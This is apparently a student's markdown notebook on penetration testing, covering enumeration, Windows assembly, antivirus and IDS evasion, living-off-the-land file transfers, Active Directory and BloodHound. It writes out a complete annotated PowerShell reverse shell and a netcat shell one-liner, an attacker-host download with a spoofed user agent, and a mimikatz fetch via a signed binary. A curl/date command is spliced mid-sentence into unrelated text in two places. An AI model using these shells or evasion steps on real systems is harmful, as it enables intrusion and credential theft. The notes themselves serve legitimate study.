- [Definitions](#definitions)
  - [Shells](#shells)
- [Enumeration](#enumeration)
  - [Online presence](#online-presence)
  - [DNS](#dns)
  - [Cloud](#cloud)
- [Defense in Depth](#defense-in-depth)
- [Concept of attack](#concept-of-attack)
- [Assembly in Windows](#assembly-in-windows)
  - [Registers](#registers)
  - [Operations](#operations)
    - [Flags](#flags)
    - [Calling COnvention](#calling-convention)
    - [Memory Layout](#memory-layout)
- [Firewalls and AntiVirus Evasion](#firewalls-and-antivirus-evasion)
  - [Creating Payload](#creating-payload)
  - [Obfuscation](#obfuscation)
  - [Signature Evasion](#signature-evasion)
  - [Firewalls](#firewalls)
- [Network Security Evasion](#network-security-evasion)
  - [IDS x IPS](#ids-x-ips)
- [Windows](#windows)
- [Living Off the Land](#living-off-the-land)
  - [Detection and Evading file transfer](#detection-and-evading-file-transfer)
- [ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)](#active-directory-domain-service-ad-ds)
  - [Definitions](#definitions-1)
  - [Protocols](#protocols)
    - [Kerberos, DNS, LDAP, MSRPC](#kerberos-dns-ldap-msrpc)
    - [NTLM Authentication](#ntlm-authentication)
  - [Users, Machine Accounts, Groups, Rights/privileges](#users-machine-accounts-groups-rightsprivileges)
  - [Hardening](#hardening)
  - [BloodHound](#bloodhound)
    - [Blue Team](#blue-team)
    - [Azure](#azure)

## Definitions
- **Attack Vector**: tool, technique method USED to attack
  - weapons, phishing, DOS, Web drive-by, Flaws in browser, unpachecksecd vulnerability
- **Attack Surface**: surface area of the victim that ca be impacted
  - unarmoured body, email server, internet-facebing web, end-user machine, humans
- **Attack Surface Reduction**: 
  - Closing unused ports
  - strong password policy
  - lock out after X attempts
  - No sensitive information in public repositories
  - phishing protection
  - Disable macros
  - [Microsoft Attack surface reduction (ASR) rules reference](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)
  - patch software

### Shells
- **Understanding the Command**
```
# Linux
## Create listener
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234 > /tmp/f

1. rm -f /tmp/f = remove the file /tmp/f if exists (-f)
2. ; = sequential execution
3. mkfifo /tmp/f = create named pipe
4. cat /tmp/f | = concatenates the FIFO named pipe file 
5. | = connects stdout to stdin of the commands
6. /bin/bash -i 2>&1 | = specifiy the bash interactive (-i) + standard error data stream (2) $ standar output data stream (1) redirected to the next command
7. nc -l $TARGET 1234 > /tmp/f = send the result to nc, output sent to /tmp/f that uses bbash sehll waiting for the connection

# Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

1. powershell -nop -c = powershell with no profile (nop) and execute command block (-c)
2. $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) = sets variable $client, create object System.Net.Socket.TCPCLIENT
3. ; = sequential execution
4. $stream = $client.GetStream() = set $stream to $client, GetStream uses for network communication
5. [byte[]]$bytes = 0..65535|%{0} = byte type array [], returns 65535 zeros as values. Empty byte stream that is sent to TCP listener
7. while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) = loop using the $bytes
8. {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) = sets $data to ASCII enconding. Encode $byte stream to ASCII.
9. $sendback = (iex $data 2>&1 | Out-String ) = set $sendback to the Invoke-Expresion (iex) to $data. Standar error+ouput to the Out-String which cnverts input objects into strings
10. $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ' = $sendback2 is $sndback + string PS + current directory = the shell will be in the current directory
11. $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; =  sets $sendbyte to ASCI enconded byte stream that use TCP client to initiate PS session with NC
12. $client.Close() = to be used when the connection is closes
```
- Also as [script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

## Enumeration
- Infrastrcuture-based
- Host-based
- OS-based
- Layers
  - Internet: internal/external access
    - Domains, Subdomains, vHost, IP, Cloud
    - Target: identify target systems/interfaces
  - Gateway; security measures
    - DMS, IPS/IDS, Proxies, VPN, Segmentation
  - Services:
    - Type, FUnctionality, config, port, version
    - Target: reasion/functionality of target system
  - Privileges: internal permissions and privileges
    - groups, users, permissions, restrictions, environment
    - Target: identify what is possible
  - OS Setup: internal components and systems setup
    - OS, PATCH level, network config, config files, sensitive files
    - Target: sensitive information, how it is managed

### Online presence
- SSL certificates: read domains/subdomains
  - vrt.sh
  - curl -s https://crt.sh/\?q\=TARGET.com\&output\=json | jq . 
- Domains
  - curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
- host:
```
# find where domains are hostes
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

# scan with shodan
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

### DNS
- A: IP --> Domain
  - AAAA: IPv6
- MX: mail records
- NS: name servers to resolv FQDN to IP
- TXT: verification keiys 

### Cloud
- hosted where:
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done

# Search AWS
intext:???? inurl:amazonaws.com

# Search Azure
intext:???? inurl:blob.core.windows.net
```

- [GrayHatWarfare](https://buckets.grayhatwarfare.com/)
  - find AWS, Azure and GCP

## Defense in Depth
- Severel layers of defense
- secure everything on the way
- Levels
  - Perimeter
    - WAF, FIrewalls, DMZ
  - layers
   - apllication of sensors, analytics, alerting,
   - first level defense, network segmentation, zeto trust, least privileged access
  - response
    - Detection, log collection, analytics

## Concept of attack
|      Source ->    |     Processes ->    | Privileges -> | Destination |
|-------------------|---------------------|---------------|-------------|
|code,libs,         |PID,input,Vars       |System,User,   |Local: file,process,|
|config,API, Input, |Logging,Proc, rules  |Groups, policy,|Network: Interface, address, Route |


## Assembly in Windows
[Tryhackme - Windows x64 Assembly](https://tryhackme.com/room/win64assembly)

### Registers
- Variables
- Faster to access
- Bigger ones go to RAM = slower
- Also user Pointer
- General-Purposes Registers
  - RAX = accumulator register = store return value
    - R Register
    - E Extended
    - [Other registers](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture)
    - [ALL registers](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture)
  - RBX = base register = used as base pointer
  - RDX = data register
  - RCX = counter register = loop
  - RSI = source index = source pointer in string
  - RDI = destination index = destination pointer in string
  - RSP = stack pointer = holds address of the top of the stack
  - RBP = base pointer  = hold address of the bottom of the stack. To restore to the function
  - RIP = Instruction Pointer = address of **next line**

### Operations
- Around 1500 instructions
- Terms
  - immediate = IM = constant
  - register = RAX, RBX, AL
  - memory = location in memory
  
- Instruction
  - (Instruction/Opcode/Mnemonic) <Destination>, <Source>
  - mov RAX, 5

- Common Instructions
  - mov = move = store data
  - lea = load effective address = no dereference AND calculate addresses ONLY
  - push = push onto stack (put on top) ~= copy = save date inside register
  - pop = take from the stack and store in the destination
  
- Arithmetic
  - inc = increment
  - dec = decrement
  - add = add  (source to destinatination)
  - sub = subtract  
  - Multiplication
    - MUL (unsigned) / IMUL (signed) = 
      - RDX:RAX
    - DIV / IDIV
      - RBX:RAX
  - Flow Control:
    - cmp = compare
    - jcc = conditional jumps
      - JNE, JLE, JG = jump not equal, jump less then, jump greater
    - call = call
    - ret = return to caller
    - NOP = no operation = padding
  
- Pointers
  - [var] = &var = dereference 
  - LEA = ignores squars []

- jg (jump if greater) x ja (jumb if above)
  - JB/JNAE = jump if below | not above or equal
  - JAE/JNB = jump if above or equal / not below
  - JBE/JNA = jump if below or equal | not above
  - JA/JNBE = jump if above | not below or equal

#### Flags
- Result of previous operation/comparison
- Register: EFLAGS / RFLAGS
- Status
  - Zero Flag =  result zero
  - Carry Flag = unsgined
  - Overflow Flag = signed too big
  - Sign Flag = result negative
  - Adjust/Auxiliary Flag = Carry = 
  - Parity Flag = 1 if last 8 bits = even
  - Trap Flag = single stepping

#### Calling COnvention
- Several
- How parameters arge passed to functions
- Caller = making the call
- Calee = called function
- Types: syscakk, stdcall, fastcall, cdecl
- **Fastcall**
  - for windows x64
  - Application Binary Intercace (ABI)
  - First 4 Parameters: 
    - Left--to--Right
    - integer: RCX, RDX, R8, R9
    - floating: XMM0, XMM1, XMM2, XMM3
    - others go the stack = right to left
  - Too big = passed as referece = pointer to data in memory 
  - Caller allocates space for calee
  - RAX, RCX, RDX, R8, R9, R10, R11, and XMM0-XMM5 = volatile
  -  RBX, RBP, RDI, RSI, RSP, R12, R13, R14, R15, and XMM6-XMM15 = nonvolatile
- [More Info](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=vs-2019) and [Here](https://docs.microsoft.com/en-us/cpp/build/x64-software-conventions?view=vs-2019)

- cdecl
  - C Declaration
  - parameters on stack: righsudo date -s "$(curl http://s3.amazonaws.com -v 2>&1 | \
  grep "Date: " | awk '{ print $3 " " $5 " " $4 " " $7 " " $6 " GMT"}')"t to lefht
  - RBP saved
  - return via EAX
  - caller: cleans stack

#### Memory Layout
- Segment
  - Stack = non-static local variable
  - Heap = dynamically allocated
  - .data = global and static data initialized not zero
  - .bss = global and static data, uninitialized or zeor
  - .text = source code
- TEP = Thread Environment Block = info about currently running thread
- PEB = Process Enviroment Block = info about the processes and loade modules
- Stack Frames
  - chuncks of data: local variables, saved base pointer, return address of the caller and parameters
  
| Lower Address  | Local var      | RBP - 8  |
| -------------- | -------------- | --------|
|                | Return Address | RBP + 0  |
|                | saved RBP      | RBP + 8  |
| Higher Address | Func Parameters| RBP + 16 |

- Endianness
  - big endian: most significant byte far left
  - little endien: most significant byte far right

## Firewalls and AntiVirus Evasion
- Tools
  - Compressor
  - Emulator

- Detection
  - Static: signarute, pattern-matching
  - Dynamic: run time detection
  - Heuristic/Behavioral: source code compare; 

- Yara
  - rule-base detection

- Testing files
  - [AntiscanMe](https://antiscan.me/)
  - [Scan Jotti](https://virusscan.jotti.org/)

### Creating Payload
- Assembly
- Write in a section of the PE
- Extract hex value from compiled code
```
1. Write assemble code
2. Extract hex from the code: objcopy -j .text -O binary thm thm.text
3. Convert to hex: xxd -i thm.text
```

- [Staged x Stageless payload](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
  - Stageless: complete shellcode
  - staged: partial shellcode that "contacts" the complete one. First shellcode connects to attacker, Second donwload the final shellcode (less noisi, direct in memory)


- Packers
  - transform structure of program
  - compress + protect agains reverse engineering
  - In memory scan: wait to send commands after the shell is running
  - Use smaller palyoad

- Binders
  - program to merge 2 or + executables 
  - sudo date -s "$(curl http://s3.amazonaws.com -v 2>&1 | \
  grep "Date: " | awk '{ print $3 " " $5 " " $4 " " $7 " " $6 " GMT"}')"

### Obfuscation
- [Very good explained](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3)
- Prevent software analysis
- Bypass AV - signature base
- Layers of obfuscation: code, layout, etc.
  - How: merge, splitting, encoding, replacing, no traceble name

### Signature Evasion
- Split file until kilobyte range
- [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1)
- Other tools: DefenderCheck, ThreatCheck, AMSITrigger

### Firewalls
- Statefull: stablished tcp session, detect/block packet outside session
- Stateless: individual packeges, no analysis of session

## Network Security Evasion

### IDS x IPS
- Intrusion Detecting System
- Intrusion Prevention System ==> inline
- host-base AND network-based
- Evade
  - protocol manipulation
  - payload manipulation
  - route manipulation
  - tactical denial of service

- Obfuscation
  - base64 
  - urlencode
  - [Cyberchef](https://icyberchef.com/)
- DoS
  - legitim traffic = overload capacitiy
  - not-malicious traffic, that goes to log
- C2: change settings
  - User-Agent
  - sleep-time
  - jitter = randomness to sleep time
  - ssl certificate 
  - DNS beacon
  - [Cobalt Guideline](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile)
- NGNIPS
  - context awareness
  - application layer
  - content awareness
  - agile engine

## Windows
- Folder structures
  - AppData
    - Roaming: machine-independent data
    - Local: specific to the computer, not sync
    - LocalLow: lower integritity
- Commands
  - dir /a = all
  - tree /f
  
- FS
  - FAT32
    - files less 4 GB
    - no date protection or compression
    - compatibility
  - NTFS
    - default
    - restore
    - security
    - journaling
    - not mobile
    - not for tv,camera
  
- Permissions
  - [icalcs = Integrity Control Access Control List](https://ss64.com/nt/icacls.html)
    - F = full
    - D = delete
    - N = no Access
    - M = modify
    - RX = read and execute
    - R = read
    - W = write only
  - Resource level
    - (CI): container inherit
    - (OI): object inherit
    - (IO): inherit only
    - (NP): do not propagate inherit
    - (I): permission inherited from parent container
  - icalcs
    - /gran username:f
    - /remove username

- Logs
  - Event Viewer
  - Computer Management

- [Services](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_components#Services)
  - sc.exe
  - Get-Service
    - | ? {$_.Status -eq "Running"} | select -First 10 | table
    - lsass.exe = Local Security Authority Subsystem Service = login/password
  - sc
    - qc SERVICENAME = query config
    - //IP|hostaneme SERVICENAME
    - stop | start | query NAME
    - config NAME binPath=C:\path\to\exe.exe  
    - sdshow =security descriptor = Security description definition language (SDDL)
      - DACL = control access
      - SACL = account for + log

```
D: (A;;CCLCSWRPLORC;;;AU)
D: - the proceeding characters are DACL permissions
AU: - defines the security principal Authenticated Users
A;; - access is allowed
CC - SERVICE_QUERY_CONFIG is the full name, and it is a query to the service control manager (SCM) for the service configuration
LC - SERVICE_QUERY_STATUS is the full name, and it is a query to the service control manager (SCM) for the current status of the service
SW - SERVICE_ENUMERATE_DEPENDENTS is the full name, and it will enumerate a list of dependent services
RP - SERVICE_START is the full name, and it will start the service
LO - SERVICE_INTERROGATE is the full name, and it will query the service for its current status
RC - READ_CONTROL is the full name, and it will query the security descriptor of the service
```
  - Get-Acl
    - -PATH HKLM:\path\to\service

- Sessions
  - Local System = root
  - Local Service = similar to local user
  - Network Service = similar to standard domain user

- Security
  - SID = security identifier
  - SAM = Security Accounts Manager
    - grants rights
  - ACE = Access Control Entries
    - manages rights
  - [UAC = User Access Control](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)
    - prevent malware from running/manipulating processes
  - [Registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types)
    - HKLM = Root Key Local Machine
    - HKCU = User specific
    - low-level settings for windows and apps
    - Run and RunOnce regstriy keys
      - reg query
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

- Denfender
  - Get-MpComputerStatus

## Living Off the Land
- Using and abusing of what exists
- How
  - Reconnaissance
  - Files operations
  - Arbitrary code execution
  - Lateral movement
  - Security product bypasse
  - [Windows - Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/)
  - [Linux - GTFOBins](https://gtfobins.github.io/)
  
### Detection and Evading file transfer
- [Analyze user agent](https://useragentstring.com/index.php)
  - [User agents strings](https://useragentstring.com/pages/useragentstring.php)

- **Evading**:
  - [Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4&viewFallbackFrom=powershell-7.1)
  - Mask UserAgent

```
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16

# Command
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
IWR http://$ATTACKER/file.exe -UserAgent $UserAgent -OutFile 
```

- Intel Win10
  - fxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"

## ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)
### Definitions
  - Domain Controler: server that runs AD. Provides AD services + control all
  - AD: repository/database where this users/computers are
  - Organizational Unit (OU): containers inside AD, classify user/machines. Apply policies
    - Group Policy Objects
      - network distribution: gpupdate /force
      - SYSVOL: shared networ
  - AD Domains: collection of components within AD
  
- Attributes = characteristics
  - hostname, DNS name, displayName ...
- Schema: classes users/computer
- Domain = logical group of objects (users, computers, UO, groups)
- Tree: several domains that begins at a single root domain
- Forest: collection of domains
  - collection of trees + different namespace
  - Trust Relationshing
- Enterprese Admins: over all domains
- GUID = Global Unique Identifier
  - for every object

```
# Basic Structure
INLANEFREIGHT.LOCAL/
├── ADMIN.INLANEFREIGHT.LOCAL
│   ├── GPOs
│   └── OU
│       └── EMPLOYEES
│           ├── COMPUTERS
│           │   └── FILE01
│           ├── GROUPS
│           │   └── HQ Staff
│           └── USERS
│               └── barbara.jones
├── CORP.INLANEFREIGHT.LOCAL
└── DEV.INLANEFREIGHT.LOCAL
```

- Security Principals
  - authenticateble, manage access to resources
- **Security Identifier (SID)**
  - For security principal or security group
- Distinguished Name (DN)
  - full path to o object 
  - cn=pat, ou=IT, ou=Finance, dc=domain, dc=local
- Relative Distinguished Name (RDN)
  - component of DN
  - cn=pat, ou=IT, ou=Finance, dc=domain, dc=local != cn=pat, dc=domain, dc=local
- **sAMAAccountName**
  - users logon = pat
- userPrincipalName
  - pat@domain.local
- Flexible Single Master Operation
  - Schema Master + Domain Namim Master + Relative ID (RID) Master + Primary Domain Controller Emulator + Infrastrcuture Master
- Global Catalog (GC)
  - copy of all object os forest
- Read-Only Domain COntroller (RODC)
  - no passwords chached
- Replication 
  - update/transfer of AD objects
  - synchrnonization to all DCs in the forest
- **Service Principal Name (SPN)**
  - identifies a service instance - Kerberos authentication
- Group Policy Object (GPO)
  - virtual collenctions of policy settings
- Access Controle List (ACL)
  - Collection of Access Control Entries
- Access Control Entries (ACE)
  - identify trustee (user, group, logon) + list access rights
- **Discretionary Access Control List (DACL)**
  - Define which security principles are granted/deneis to an object
- System Access Control Lists (SACL)
  - Log access attempt
- **Fully Qualified Domain Name (FQDN)**
  - complete name of computer/hst
  - hostname.domainname.tld = DC01.domain.local
- Tombstone
  - holds deleted AD objects -> attributes not preserved
- AD Recycle bin
  - attributes preserved
- **SYSVOL**
  - folder/share: copy of public files: Policies, GP, logon/logoff
  - [More](https://networkencyclopedia.com/sysvol-share/#Components-and-Structure)
- AdminSDHolder
  - manage ACLs
- dsHeuristics
  - forest-wide configuration settings
- adminCount
  - 0 = user not protected
- **NTDS.DIT**
  - database: user,groups,hashes = important

- Credentials
  - Domain Controllers
    - Kerberos
    - NetNTLM

- **Objects = any resource**
  - User:
    - People (SID + GUID)
    - Service: database, printer, service user
  - Contacts
    - outsiders (GUID)
  - Machines (SID + GUID)
    - computer that joins AD domain
    - DC01 = machine name | DC01$ = machine account name
  - Shared Folders (GUID)
  - Security Groups (SID + GUID)
    - groups and machines
    - Domain Admin, Server|Backup|Account Operators, Domain Users|COmputer|Controllers
      - privileged access
    - grant permission over resources
  - Organizational Units (OU)
    - container to store similar objects
  - Domain
    - structure of AD
  - Domain Controllers
    - Handle authentication requrest
    - Enforce security policies
  - Site
    - set of computers across one/more subnets => make replication
  - Built-in
    - default groups
  - Foreign Security Principals
    - represent to a trusted external forest
    - cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local
- [Forest and Domains](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels)
- [Functional Levels](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754918(v=ws.10)?redirectedfrom=MSDN)

- Trusts
  - authentication forest-forest domain-domain

### Protocols
#### Kerberos, DNS, LDAP, MSRPC
- Kerberos - 88
  - Authentication protocol
  - DC has Key Distribution Center (KDC) = issue tickets
    - User requests ticket from KDC ==> TGT (valid user info)
    - With TGT ==> Domain Controller ==> TGS (with NTLM hash)
    - TGS (encrypted with NTLM hahs of the service account)==> access to services
    - KDC key = encrypted key for validate TGT
  - Symmetrict/asymmetric - mutual authentication DomainControle/KDC
- DNS
  - Request name.local ==> Receives IP
  - [NetBIOS, LLMNR](https://www.a2secure.com/blog-en/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/)
- LDAP - 389(636)
  - Lightweight Directory Access Protocol
  - Authentication
    - Simple: username:password
    - SASL = Simple Authentication and Security Layer
  - explains HOW the systems in the network communicate with AD
  - DC in AD listens for LDAP requests
- MSRPC
  - Remote Procedure Call = interprocess communication
  - client-server
  - Interfaces
    - lsarcp: calls to Local Security Authority (LSA)
    - netlogon: authenticate users in the domain
    - samr: Remote SAM = managemnet for domain account db
    - drsuapi: directory replication services 

#### NTLM Authentication
- LM / NTML = hash names
- Trusted Third Party: DC
- LM old hahs
- NTLM: challange-response authentication protocol
  - Stored in SAM database
  - pass-the-hash
```
Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2:::

Rachel = username
500    = Relative Identifier (RID)
aad3.. = LM hash
e46b.. = NT hash = crackable + pass-the-hash
```

- **NTLM Protocol**
  - v1
    - challenge/response authentication ==> hash is created from it
    - NT+LM hash = capture hash via NTML relay attack
    - NOT pass the hash
  - v2
    - 2 responses to 8-byte-challange 
      - 1o 16 Byte HMAC-MD5 + random challenge + HMAC-MD5 hash of user
      - 2o Variable-lenght client challegne + current time + 8-byte-random + domain name

- **Domain Cached Credentials (MSCache2)**
  - Domain Cached Credentials (DCC)
    - HKEY_LOCAL_MACHINE\SECURITY\Cache
  - NOT pass the hash
  - Difficult to crack
  - 10 hahses for any domain users that logs in

### Users, Machine Accounts, Groups, Rights/privileges
- Users:
  - local x AD
- [Local Accounts](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts)
  - rights stay locally
  - security principal
  - Administrator:SID:S15-DOMAIN-500 ; Guest ; SYSTEM ; Network Service (Service Control Manager) ; Local Service
- [Domain Users](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts)
  - wider access
  - KRBTGT
  
- [Attributes](https://learn.microsoft.com/en-us/windows/win32/ad/user-object-attributes)
  - UserPrincipalName: username
  - ObjectGUID
  - SAMAccount: logon name
  - ObjectSID: SID
  - siDHistory
  
- **Domain-joined vs Non-Domain-joined Machines**
  - Computer resources
  - Domain joined
    - access to the domain GP
  - Non-domain joined
    - not managed by domain policy
    - separated
    - accounts only withing the thos

- [Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#about-active-directory-groups)
  - OU = grouping users/groups/computers for GP settings + admin tasks
  - Groups = assign permissions + users/pc/contact
  - type:  purpose = security | distribution
    - security: assign permissions and rights
    - distribution: distribute messages (email)
  - scope: how can be used
    - Domain Local Group: only inside the doomain
    - Global Group: another domain
    - Universal Group
  - Attributes
    - cn = Common-Name
    - member
    - groupType
    - memberOf
    - objectSid

- **Rights**
  - assigned to users/groups + deal with permissions

- **Privileges** 
  - permission to action (run program, shut down, reset password)
  - assign individually
  - [Abusing Tokens 1](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)
  - [Abusing Tokens 2](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

### Hardening
- LAPS = Local Administrator Password Solution
  - rotate local admin password
- Loggin + Monitoring
- Group Policy Security Settings
  - Account: users interaction with domain
  - Local Policies: specific to computer
  - Software restriction
  - App Control: blocking users from runing exes
- Group Managed Services Accounts (gMSA)
  - account managed by the domain + high level
- Account separation + password policiy + MFA
- Limit Domain Account
- Audit: Accounts, Permissions, Access
- Restricted groups
- Limiting server roles: web, mail domain separated
- [Best practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)

- Group Policy
  - GPO = Group Policies Objects = virtual collection of policy settings applied to users/computeres

### BloodHound
- Nodes: Computers, Users, GPS, OU, Groups
- Edges: link betweem objects
- Queries
  - (i.e) find users in groups (Domain Admin)
  - shortest path to domain admin

#### Blue Team
- [BlueHound](https://github.com/zeronetworks/BlueHound)
  - identify security issues
- [PlumHound](https://github.com/PlumHound/PlumHound)
  - generate reports from BH
- [ImproHound](https://github.com/improsec/ImproHound)
  - identify AD attack paths
- [GoodHound](https://github.com/idnahacks/GoodHound) 
  - prioritize remediation efforts

#### Azure
- Nodes/edges: AZ...
  - Tenant Name
- AzureHound: collect data from AzureAD and AzureRM via API
```
azurehound.exe -u "COMPROMISED_USER" -p "PASS" list --tenant "plaintexthacktheboxgmail.onmicrosoft.com" -o all.json
```

- [PowerZure](https://github.com/hausec/PowerZure)
  - Enumerate azure

```
# Sign in to azre
$username = "Isabella.Miller@plaintexthacktheboxgmail.onmicrosoft.com"
$password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force
$IsabellaCreds = New-Object System.Management.Automation.PSCredential $username, $password
Connect-AzAccount -Credential $IsabellaCreds

# Import PowerZure
Import-Module PowerZure.psd1

Invoke-PowerZure -h

```